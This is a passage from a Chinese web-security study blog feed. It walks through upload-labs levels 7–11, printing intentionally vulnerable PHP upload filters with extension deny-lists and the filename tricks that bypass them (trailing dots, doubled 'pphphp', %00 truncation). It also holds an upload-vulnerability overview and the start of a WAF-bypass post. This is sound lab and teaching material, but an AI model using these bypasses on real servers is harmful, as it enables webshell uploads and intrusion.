variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span><span class="token keyword">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>可以看到的是只是对文件后面的一个点做了限制，在上传的时候多加一个点就能绕过限制，同样由于Linux服务器的原因他并不会将后面的.给截掉也就是说虽然能绕过但是没办法利用。<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/13.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/14.png"></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a><font size="5"><strong>第八关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.rand<span class="token punctuation">(</span>1000,9999<span class="token punctuation">)</span>.<span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>同样类型是Linux服务器的原因代码没法被执行<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/15.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/16.png"></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a><font size="5"><strong>第九关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">".php"</span>,<span class="token string">".php5"</span>,<span class="token string">".php4"</span>,<span class="token string">".php3"</span>,<span class="token string">".php2"</span>,<span class="token string">".html"</span>,<span class="token string">".htm"</span>,<span class="token string">".phtml"</span>,<span class="token string">".pht"</span>,<span class="token string">".pHp"</span>,<span class="token string">".pHp5"</span>,<span class="token string">".pHp4"</span>,<span class="token string">".pHp3"</span>,<span class="token string">".pHp2"</span>,<span class="token string">".Html"</span>,<span class="token string">".Htm"</span>,<span class="token string">".pHtml"</span>,<span class="token string">".jsp"</span>,<span class="token string">".jspa"</span>,<span class="token string">".jspx"</span>,<span class="token string">".jsw"</span>,<span class="token string">".jsv"</span>,<span class="token string">".jspf"</span>,<span class="token string">".jtml"</span>,<span class="token string">".jSp"</span>,<span class="token string">".jSpx"</span>,<span class="token string">".jSpa"</span>,<span class="token string">".jSw"</span>,<span class="token string">".jSv"</span>,<span class="token string">".jSpf"</span>,<span class="token string">".jHtml"</span>,<span class="token string">".asp"</span>,<span class="token string">".aspx"</span>,<span class="token string">".asa"</span>,<span class="token string">".asax"</span>,<span class="token string">".ascx"</span>,<span class="token string">".ashx"</span>,<span class="token string">".asmx"</span>,<span class="token string">".cer"</span>,<span class="token string">".aSp"</span>,<span class="token string">".aSpx"</span>,<span class="token string">".aSa"</span>,<span class="token string">".aSax"</span>,<span class="token string">".aScx"</span>,<span class="token string">".aShx"</span>,<span class="token string">".aSmx"</span>,<span class="token string">".cEr"</span>,<span class="token string">".sWf"</span>,<span class="token string">".swf"</span>,<span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> deldot<span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//删除文件名末尾的点        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strrchr<span class="token punctuation">(</span><span class="token variable">$file_name</span>, <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 获取文件后缀名        <span class="token variable">$file_ext</span> <span class="token operator">=</span> strtolower<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //转换为小写        <span class="token variable">$file_ext</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token string">'::<span class="token variable">$DATA</span>'</span>, <span class="token string">''</span>, <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//去除字符串::<span class="token variable">$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //首尾去空                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>, <span class="token variable">$deny_ext</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span><span class="token keyword">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>按照上面写的可以将文件的后缀名设置为phP. . 绕过但同时由于Linux的原因代码无法被正常的执行<br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/17.png"></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a><font size="5"><strong>第十关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">"php"</span>,<span class="token string">"php5"</span>,<span class="token string">"php4"</span>,<span class="token string">"php3"</span>,<span class="token string">"php2"</span>,<span class="token string">"html"</span>,<span class="token string">"htm"</span>,<span class="token string">"phtml"</span>,<span class="token string">"pht"</span>,<span class="token string">"jsp"</span>,<span class="token string">"jspa"</span>,<span class="token string">"jspx"</span>,<span class="token string">"jsw"</span>,<span class="token string">"jsv"</span>,<span class="token string">"jspf"</span>,<span class="token string">"jtml"</span>,<span class="token string">"asp"</span>,<span class="token string">"aspx"</span>,<span class="token string">"asa"</span>,<span class="token string">"asax"</span>,<span class="token string">"ascx"</span>,<span class="token string">"ashx"</span>,<span class="token string">"asmx"</span>,<span class="token string">"cer"</span>,<span class="token string">"swf"</span>,<span class="token string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //函数移除字符串两侧的空白字符        <span class="token variable">$file_name</span> <span class="token operator">=</span> str_ireplace<span class="token punctuation">(</span><span class="token variable">$deny_ext</span>,<span class="token string">""</span>, <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH.<span class="token string">'/'</span><span class="token keyword">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>这里的代码对文件名进行修改为old.pphphp在线工具当中可以看到函数是直接将old.pphphp解析为了php后缀</p><p><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/18.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/19.png"><br><img src="/2023/10/04/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-021/20.png"></p><h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a><font size="5"><strong>第十一关</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> array<span class="token punctuation">(</span><span class="token string">'jpg'</span>,<span class="token string">'png'</span>,<span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> substr<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>,strrpos<span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>,<span class="token string">"."</span><span class="token punctuation">)</span>+1<span class="token punctuation">)</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>,<span class="token variable">$ext_arr</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span>.<span class="token string">"/"</span>.rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>,<span class="token variable">$img_path</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else&amp;#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。<br>substr() 函数返回字符串的一部分。</p><ol><li>关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'save_path'</span><span class="token punctuation">]</span>.<span class="token string">"/"</span>.rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span></code></pre><ol start="2"><li>这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件</li></ol><pre class=" language-bash"><code class="language-bash">php版本小于5.3.4php的magic_quotes_gpc为OFF状态</code></pre>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-020</title>
      <link href="/2023/10/03/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-020/"/>
      <url>/2023/10/03/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-020/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件上传之基础及过滤方式"><a href="#WEB漏洞-文件上传之基础及过滤方式" class="headerlink" title="WEB漏洞-文件上传之基础及过滤方式"></a><font size="6"><strong>WEB漏洞-文件上传之基础及过滤方式</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/03/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-020/1.png"></p><pre class=" language-bash"><code class="language-bash">什么是文件上传漏洞？文件上传漏洞有哪些危害?比如上传后门文件，进而拿权限等等（一句话木马）文件上传漏洞如何查找及判断？扫描、会员中心、后台系统、代码分析等等文件上传漏洞有哪些需要注意的地方？关于文件上传漏洞在实际应用中的说明?</code></pre><p><img src="/2023/10/03/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-020/2.png"></p><h3 id="二、演示案例"><a href="#二、演示案例" class="headerlink" title="二、演示案例"></a><font size="5"><strong>二、演示案例</strong></font></h3><p>● 常规文件上传地址的获取说明<a href="https://www.cnblogs.com/backlion/p/10421405.html">https://www.cnblogs.com/backlion/p/10421405.html</a><br>比如vip账号的url(例：<a href="https://www.easyicon.net/vip/)%EF%BC%8C%E5%86%8D%E7%94%A8%E9%93%B8%E5%89%91%E6%88%96%E8%80%85%E5%BE%A1%E5%89%91%E6%89%AB%E6%8F%8F%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84url(%E7%94%A8%E9%93%B8%E5%89%91%E5%8F%AF%E4%BB%A5%E6%89%AB%E5%87%BAhttps://www.easyicon.net/vip/kindeditor%EF%BC%8C%E8%AF%B4%E6%98%8E%E6%AD%A4url%E6%9C%89%E6%BC%8F%E6%B4%9E)">https://www.easyicon.net/vip/)，再用铸剑或者御剑扫描，可以得出漏洞的url(用铸剑可以扫出https://www.easyicon.net/vip/kindeditor，说明此url有漏洞)</a><br>● 不同格式下的文件类型后门测试。<br>● 配合解析漏洞下的文件类型后门测试<br>● 本地文件上传漏洞靶场环境搭建测试<br>● 某CMS及CVE编号文件上传漏洞测试</p><h3 id="三、涉及资源"><a href="#三、涉及资源" class="headerlink" title="三、涉及资源"></a><font size="5"><strong>三、涉及资源</strong></font></h3><p><a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-019</title>
      <link href="/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/"/>
      <url>/2023/10/02/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-019/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-SQLMAP绕过WAF"><a href="#WEB漏洞-SQLMAP绕过WAF" class="headerlink" title="WEB漏洞-SQLMAP绕过WAF"></a><font size="6"><strong>WEB漏洞-SQLMAP绕过WAF</strong></font></h2><span id="more"></span><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><font size="5"><strong>一、前言</strong></font></h3><p>前言:促使本文产生最初的动机是前些天在做测试时一些攻击向量被WAF挡掉了，而且遇到异常输入直接发生重定向。之前对WAF并不太了解，因此趁此机会科普一下并查阅了一些绕过WAF的方法。网上关于绕过WAF有诸多文章，但是观察之后会发现大体上绕过WAF的方法就那八、九种，而且这些技术出来也有些日子了，继续使用这些方法是否有效有待于我们在实际中去验证。看过数篇绕过WAF的文章后，前人对技术的总结已经比较全面，但是完整的内容可能分布在各处，查阅起来不太方便。另外，我们谈绕过WAF，其实就是谈如何绕过过滤机制，如果在讨论bypass技术的时候明确一下现有的一些filter的实现及其evasion，对于我这样的初学者来说是不是更好？还有就是如果在文章后面可以提供一些测试向量提供思路和参考，内容看起来很杂，但是也会比较方便呢?抱着这些想法，同时也顶着巨大的压力(前人工作已经比较完善，这么大的信息量总结起来对我是一次挑战)，我还是决定写出本文，这样更能适应自己的需求，也可能更加适合一些朋友的需求。</p><p>本文内容从技术上来说并非原创，也没有很新的或重大的发现，乃是这几天从各种资料信息中进行整理所得。本文会对形如<a href="http://www.site.com的uri进行简化,约定为z.com./">http://www.site.com的URI进行简化，约定为z.com。</a></p><h3 id="二、WAF的常见特征"><a href="#二、WAF的常见特征" class="headerlink" title="二、WAF的常见特征"></a><font size="5"><strong>二、WAF的常见特征</strong></font></h3><p>之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。</p><p>总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：</p><pre class=" language-bash"><code class="language-bash">1. 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话2. 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式3. 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。4. WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</code></pre><p>WAF的常见特点：</p><pre class=" language-bash"><code class="language-bash">异常检测协议：拒绝不符合HTTP标准的请求增强的输入验证：代理和服务端的验证，而不只是限于客户端验证白名单<span class="token 